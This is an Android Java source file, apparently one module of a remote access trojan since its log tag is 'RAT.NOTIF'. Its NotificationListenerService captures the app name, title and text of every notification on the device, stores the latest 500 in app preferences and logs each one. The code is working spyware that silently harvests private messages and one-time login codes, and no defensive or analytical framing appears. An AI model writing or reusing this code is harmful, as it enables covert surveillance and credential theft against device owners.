package com.nullx.pp;

import android.content.Context;
import android.content.SharedPreferences;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class NotificationReader extends NotificationListenerService {
    private static final String TAG = "RAT.NOTIF";
    private static final int MAX_NOTIFS = 500;

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String pkg = sbn.getPackageName();
            String title = "";
            String text = "";
            if (sbn.getNotification().extras != null) {
                CharSequence t = sbn.getNotification().extras.getCharSequence("android.title");
                CharSequence c = sbn.getNotification().extras.getCharSequence("android.text");
                if (t != null) title = t.toString();
                if (c != null) text = c.toString();
            }
            if (pkg.equals(getPackageName())) return;

            SharedPreferences sp = getSharedPreferences("NotifPrefs", Context.MODE_PRIVATE);
            String existing = sp.getString("notifs", "[]");
            JSONArray arr = new JSONArray(existing);
            JSONArray newArr = new JSONArray();
            int start = Math.max(0, arr.length() - MAX_NOTIFS + 1);
            for (int i = start; i < arr.length(); i++) newArr.put(arr.get(i));

            JSONObject entry = new JSONObject();
            entry.put("pkg", pkg);
            entry.put("title", title);
            entry.put("text", text);
            entry.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
            newArr.put(entry);
            sp.edit().putString("notifs", newArr.toString()).apply();

            Log.d(TAG, "[" + pkg + "] " + title + " — " + text);
        } catch (Exception e) {
            Log.e(TAG, "onNotificationPosted error: " + e.getMessage());
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}
}